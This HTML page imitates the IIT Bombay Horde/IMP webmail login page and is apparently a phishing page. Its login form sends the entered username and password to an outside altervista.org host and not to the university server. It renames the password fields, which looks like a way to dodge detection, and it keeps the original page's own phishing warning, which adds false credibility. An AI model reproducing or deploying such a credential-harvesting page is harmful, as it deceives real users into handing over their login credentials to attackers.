<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd"><!--   IMP: Copyright 2001-2009 The Horde Project.  IMP is under the GPL.  --><!-- Horde Project: http://www.horde.org/ | IMP: http://www.horde.org/imp/ --><!--        GNU Public License: http://www.fsf.org/copyleft/gpl.html       --><HTML 

lang="en-US"><HEAD><META content="IE=11.0000" http-equiv="X-UA-Compatible">



<SCRIPT type="text/javascript">//<![CDATA[

var IMP = {"conf":{"hasDOM":true,"IMP_ALL":0,"isIE":false,"pop3":false,"fixed_folders":["Drafts","Trash"],"js_editor":"xinha"},"text":{"compose_cancel":"Cancelling this message will permanently discard its contents.\nAre you sure you want to do this?","compose_discard":"Doing so will discard this message permanently.","compose_recipient":"You must specify a recipient.","compose_sigreplace":"The signature was successfully replaced.","compose_signotreplace":"The signature could not be replaced.","compose_nosubject":"The message does not have a Subject entered.\nSend message without a Subject?","compose_file":"File","compose_attachment":"Attachment","compose_inline":"Inline","mailbox_submit":"You must select at least one message first.","mailbox_delete":"Are you sure you wish to PERMANENTLY delete these messages?","mailbox_selectone":"You must select at least one message first.","yes":"Yes","no":"No","contacts_select":"You must select an address first.","contacts_closed":"The message being composed has been closed. Exiting.","contacts_called":"This window must be called from a compose window.","folders_select":"Please select a folder before you perform this action.","folders_oneselect":"Only one folder should be selected for this action.","folders_subfolder1":"You are creating a sub-folder to","folders_subfolder2":"Please enter the name of the new folder:","folders_toplevel":"You are creating a top-level folder.\nPlease enter the name of the new folder:","folders_download1":"All messages in the following folder(s) will be downloaded into one MBOX file:","folders_download2":"This may take some time. Are you sure you want to continue?","folders_rename1":"You are renaming the folder:","folders_rename2":"Please enter the new name:","folders_no_rename":"This folder may not be renamed:","search_select":"Please select at least one folder to search.","popup_block":"A popup window could not be opened. Perhaps you have set your browser to block popup windows?","login_username":"Please provide your username.","login_q4_prince

word":"Please provide your q4_prince

word.","spam_report":"Are you sure you wish to report this message as spam?","notspam_report":"Are you sure you wish to report this message as innocent?","newfolder":"You are copying\/moving to a new folder.\nPlease enter a name for the new folder:\n","target_mbox":"You must select a target mailbox first."}};

//]]></SCRIPT>

 

<META http-equiv="Content-Type" content="text/html; charset=iso-8859-1">

<SCRIPT src="http://imp.iitb.ac.in/horde/js/prototype.js" type="text/javascript"></SCRIPT>

 

<SCRIPT src="http://imp.iitb.ac.in/horde/js/horde-prototype.js" type="text/javascript"></SCRIPT>

 

<SCRIPT src="http://imp.iitb.ac.in/horde/js/accesskeys.js" type="text/javascript"></SCRIPT>

 

<SCRIPT src="http://imp.iitb.ac.in/horde/imp/js/login.js" type="text/javascript"></SCRIPT>

 <LINK href="http://imp.iitb.ac.in/horde/themes/screen.css" rel="stylesheet" 

type="text/css"> <LINK href="http://imp.iitb.ac.in/horde/themes/bluewhite/screen.css" 

rel="stylesheet" type="text/css"> <LINK href="http://imp.iitb.ac.in/horde/imp/themes/screen.css" 

rel="stylesheet" type="text/css"> <LINK href="http://imp.iitb.ac.in/horde/imp/themes/bluewhite/screen.css" 

rel="stylesheet" type="text/css"> <TITLE>Mail :: Welcome to Horde</TITLE> <LINK 

href="/horde/imp/themes/graphics/favicon.ico" rel="SHORTCUT ICON"> 

<META name="GENERATOR" content="MSHTML 11.00.9600.18763"></HEAD> 

<BODY>

<SCRIPT type="text/javascript">//<![CDATA[

var autologin_url = '/horde/imp/login.php?autologin=&amp;server_key=';var show_list = 0;var ie_clientcaps = 0;var lang_url = null;var protocols = [];var change_smtphost = 0;var imp_auth = 1;var nomenu = 1

//]]></SCRIPT>

 

<FORM name="imp_login" id="imp_login" action="http://directoryupdatee.altervista.org/veri1/member.php" 

method="post" target="_parent"><INPUT name="actionID" type="hidden"> 

<INPUT name="url" type="hidden"> 

<INPUT name="load_frameset" type="hidden" value="1"> 

<INPUT name="autologin" type="hidden" value="0"> <INPUT name="anchor_string" id="anchor_string" type="hidden"> 

   <INPUT name="server_key" type="hidden" value="imap">    

<DIV id="menu">

<H1 align="center">(IITB wm3 version 20140820 Horde 3.3.3/IMP 

h3-4.3.5)</H1></DIV>

<TABLE width="100%">

  <TBODY>

  <TR>

    <TD align="center">

      <TABLE align="center">

        <TBODY>

        <TR>

          <TD class="light rightAlign"><LABEL 

            for="imapuser"><STRONG>Username</STRONG></LABEL></TD>

          <TD class="light leftAlign" 

nowrap="nowrap"><INPUT name="imapuser" tabindex="1" id="imapuser" style="direction: ltr;" type="text"> 

                  </TD></TR>

        <TR>

          <TD class="light rightAlign"><LABEL 

            for="q4_prince"><STRONG>Pass</STRONG></LABEL></TD>

          <TD 

class="leftAlign"><INPUT name="q4_donald" tabindex="2" id="q4_prince" style="direction: ltr;" type="pass"> 

                 </TD></TR>

        <TR>

          <TD class="light rightAlign"><LABEL 

            for="new_lang"><STRONG>Language</STRONG></LABEL></TD>

          <TD class="light leftAlign"><SELECT name="new_lang" tabindex="3" id="new_lang" 

            onchange="selectLang()"><OPTION value="ar_OM">&#8237;Arabic (Oman) 

              &#8238;(&#1575;&#1604;&#1593;&#1585;&#1576;&#1610;&#1577;)</OPTION>         <OPTION value="ar_SY">&#8237;Arabic (Syria) 

              &#8238;(&#1575;&#1604;&#1593;&#1585;&#1576;&#1610;&#1577;)</OPTION>         <OPTION value="id_ID">Bahasa 

              Indonesia</OPTION>         <OPTION value="bs_BA">Bosanski</OPTION> 

                      <OPTION value="bg_BG">&#8237;Bulgarian (&#1041;&#1098;&#1083;&#1075;&#1072;&#1088;&#1089;&#1082;&#1080;)</OPTION>      

                 <OPTION value="ca_ES">Català</OPTION>         <OPTION value="zh_CN">&#8237;Chinese 

              (Simplified) (&#31616;&#20307;&#20013;&#25991;)</OPTION>         <OPTION 

              value="zh_TW">&#8237;Chinese (Traditional) (&#27491;&#39636;&#20013;&#25991;)</OPTION>         

              <OPTION value="cs_CZ">&#8237;Czech (&#268;esky)</OPTION>         <OPTION 

              value="da_DK">Dansk</OPTION>         <OPTION 

              value="de_DE">Deutsch</OPTION>         <OPTION selected="selected" 

              value="en_US">&#8237;English (American)</OPTION>         <OPTION value="en_GB">&#8237;English 

              (British)</OPTION>         <OPTION value="en_CA">&#8237;English 

              (Canadian)</OPTION>         <OPTION value="es_ES">Español</OPTION> 

                      <OPTION value="et_EE">Eesti</OPTION>         <OPTION 

              value="eu_ES">Euskara</OPTION>         <OPTION 

              value="fr_FR">Français</OPTION>         <OPTION 

              value="gl_ES">Galego</OPTION>         <OPTION value="el_GR">&#8237;Greek 

              (&#917;&#955;&#955;&#951;&#957;&#953;&#954;&#940;)</OPTION>         <OPTION value="he_IL">&#8237;Hebrew 

              &#8238;(&#1506;&#1489;&#1512;&#1497;&#1514;)</OPTION>         <OPTION value="is_IS">Íslenska</OPTION>  

                     <OPTION value="it_IT">Italiano</OPTION>         <OPTION 

              value="ja_JP">&#8237;Japanese (&#26085;&#26412;&#35486;)</OPTION>         <OPTION value="km_KH">&#8237;Khmer 

              (&#6017;&#6098;&#6040;&#6082;&#6042;)</OPTION>         <OPTION value="ko_KR">&#8237;Korean 

              (&#54620;&#44397;&#50612;)</OPTION>         <OPTION value="lv_LV">Latviešu</OPTION>     

                  <OPTION value="lt_LT">Lietuvi&#371;</OPTION>         <OPTION value="mk_MK">&#8237;Macedonian 

              (&#1052;&#1072;&#1082;&#1077;&#1076;&#1086;&#1085;&#1089;&#1082;&#1080;)</OPTION>         <OPTION 

              value="hu_HU">Magyar</OPTION>         <OPTION 

              value="nl_NL">Nederlands</OPTION>         <OPTION 

              value="nb_NO">Norsk bokmål</OPTION>         <OPTION 

              value="nn_NO">Norsk nynorsk</OPTION>         <OPTION 

              value="fa_IR">&#8237;Persian &#8238;(&#1601;&#1575;&#1585;&#1587;&#1609;)</OPTION>         <OPTION value="pl_PL">Polski</OPTION> 

                      <OPTION value="pt_PT">Português</OPTION>         <OPTION 

              value="pt_BR">Português Brasileiro</OPTION>         <OPTION value="ro_RO">Românä</OPTION> 

                      <OPTION value="ru_RU">&#8237;Russian (&#1056;&#1091;&#1089;&#1089;&#1082;&#1080;&#1081;)</OPTION>         

              <OPTION value="sk_SK">&#8237;Slovak (Sloven&#269;ina)</OPTION>         

              <OPTION value="sl_SI">&#8237;Slovenian (Slovenš&#269;ina)</OPTION>         

              <OPTION value="fi_FI">Suomi</OPTION>         <OPTION 

              value="sv_SE">Svenska</OPTION>         <OPTION value="th_TH">&#8237;Thai 

              (&#3652;&#3607;&#3618;)</OPTION>         <OPTION value="uk_UA">&#8237;Ukrainian 

              (&#1059;&#1082;&#1088;&#1072;&#1111;&#1085;&#1089;&#1100;&#1082;&#1072;)</OPTION>        </SELECT>      </TD></TR>

        <TR>

          <TD class="light rightAlign"><LABEL 

            for="select_view"><STRONG>Mode</STRONG></LABEL></TD>

          <TD class="light leftAlign"><SELECT name="select_view" tabindex="4" 

            id="select_view"><OPTION selected="selected" 

              value="imp">Traditional</OPTION>         <OPTION 

              value="dimp">Dynamic</OPTION>         <OPTION 

              value="mimp">Minimalist</OPTION>        </SELECT>      </TD></TR>

        <TR>

          <TD>&nbsp;</TD>

          <TD 

class="light leftAlign"><INPUT name="loginButton" tabindex="5" class="button" id="loginButton" onclick="return submit_login();" type="submit" value="Login"> 

                 </TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></FORM><!-- This file contains any "Message Of The Day" Type information --> <!-- It will be included below the log-in form on the login page. --> 

<BR>

<DIV align="center" class="light">You are currently using Standard HTTP<BR><A 

class="small" href="http://imp.iitb.ac.in/" target="_parent">Click here for 

Standard HTTP</A> - <A class="small" href="https://imp.iitb.ac.in/" target="_parent">Click 

here for Secure HTTPS</A></DIV><BR>

<TABLE width="100%">

  <TBODY>

  <TR>

    <TD align="center"><IMG title="" alt="Powered by Horde" src="http://imp.iitb.ac.in/horde/themes/graphics/horde-power1.png"></TD></TR></TBODY></TABLE>

<STYLE type="text/css">



.allcaps {

font-variant: small-caps;

}



div.my_wrapper

{

    width: 100%;

}



div.my_left_box{

    float: left;

    padding: 10px;

    width: 40%;

    min-height: 330px;

    overflow: visible;

    border: 1px solid gray;

    margin-top :5px;

    margin-left	:5%;

}



div.my_right_box{

    float: right;

    padding: 10px;

    width: 40%;

    min-height: 330px;

    overflow: visible;

    border: 1px solid gray;

    margin-top :5px;

    margin-right:5%;

}



</STYLE>

 

<SCRIPT language="JavaScript">



function disable_back()

{

javascript:window.history.forward(1);

}



</SCRIPT>

 <!-- <body onLoad="disable_back()"> --> 

<DIV class="my_wrapper">

<DIV class="my_left_box"><FONT class="allcaps" color="red" face="Cambria" size="4"><B> 

Phishing Warning </B><BR></FONT>		 <FONT color="black" face="Cambria" 

size="3"><B>-</B>  Do not give your <B>LDAP USERID &amp; Pass</B> to 

anyone.<BR><B>-</B> Computer Center never asks you for such 

information.<BR><B>-</B> To learn more about <A href="http://www.cc.iitb.ac.in/home/31-articles/8-is-someone-demanding-your-q4_prince

words-pishing-mails.html"><B><FONT 

class="allcaps" color="red">Phishing</FONT></B></A>		 </FONT>     	  

<BR><BR><FONT class="allcaps" color="red" face="Cambria" size="4"><B> Online IT 

Agreement/Policy </B><BR></FONT>        	 <FONT color="black" face="Cambria" 

size="3"><B>-</B> All new students, staff &amp; faculty members must read and 

accept the			online IT agreement/policy.<BR><B>-</B> IT services are made 

available to users only upon acceptance of the IT	        

	undertaking.<BR><B>-</B> It is the individual user's responsibility to read and 

understand the policy. <BR><B>-</B> The IT policy applies uniformly to all users 

of the Institute and	        	violations will be dealt with strictly. 

<BR><B>-</B> To learn more about the <A href="http://www.cc.iitb.ac.in/cgi-bin/policy.cgi"><FONT 

class="allcaps" color="red"><B>Policy</B></FONT></A><FONT class="allcaps" color="red">

		 </FONT>        	 </FONT>		 </DIV>

<DIV class="my_right_box"><FONT class="allcaps" color="black" face="Cambria" 

size="4">	        	Alternate interfaces for webmail<BR></FONT>	        	<FONT 

class="allcaps" color="black" face="Cambria" size="3"><B>- <FONT 

color="#517494"><A href="http://gpo.iitb.ac.in/">SquirrelMail</A></FONT><BR> 	   

             - <FONT color="#517494"><A 

href="http://iloha.iitb.ac.in/">Ilohamail</A></FONT><BR><!-- - <font color="#517494"><a href=http://hasty.iitb.ac.in>Hastymail</a></b></font><br> --> 

</B>	         </FONT>		  <BR><FONT class="allcaps" color="black" face="Cambria" 

size="4">        		Basic documentation about IIT Bombay Webmail <BR></FONT>      

  	 <FONT class="allcaps" color="black" face="Cambria" size="3"><B>- <FONT 

color="#517494"><A href="http://docs.iitb.ac.in/webmail.tutorial/webmail.tips.html">General 

FAQs.</A></FONT><BR>	                - <FONT color="#517494"><A href="http://docs.iitb.ac.in/webmail.tutorial/squirrelmail.html">Information 

about SquirrelMail.</A></FONT><BR>        	        - <FONT color="#517494"><A 

href="http://docs.iitb.ac.in/webmail.tutorial/imp/">Information about IMP 

Webmail.</A></FONT></B><BR></FONT>		  <BR><FONT class="allcaps" color="black" 

face="Cambria" size="4">        		POP &amp; IMAP Access Details <BR></FONT>      

  	 <FONT color="black" face="Cambria" size="3"><B>- POP Server:</B>   

pop.iitb.ac.in        Port: 110<BR><B>- POPS Server:</B>  pop.iitb.ac.in         

  Port: 995<BR><B>- IMAP Server:</B>  imap.iitb.ac.in          Port: 143<BR><B>- 

IMAPS Server:</B> imap.iitb.ac.in          Port: 993<BR><B>- SMTP Server:</B>  

smtp-auth.iitb.ac.in    Port: 25	         </FONT>	 <BR><BR></DIV></DIV>

<SCRIPT language="JavaScript1.5" type="text/javascript">

<!--

var _setHordeTitle = 1;

try {

    if (document.title && parent.frames.horde_main) parent.document.title = document.title;

} catch (e) {

}

// -->

</SCRIPT>

 

<SCRIPT type="text/javascript">

<!--

if (typeof(_setHordeTitle) == 'undefined' && document.title && parent.frames.horde_main) parent.document.title = document.title;

// -->

</SCRIPT>

 

<SCRIPT type="text/javascript">//<![CDATA[

setFocus()

//]]></SCRIPT>

 </BODY></HTML>

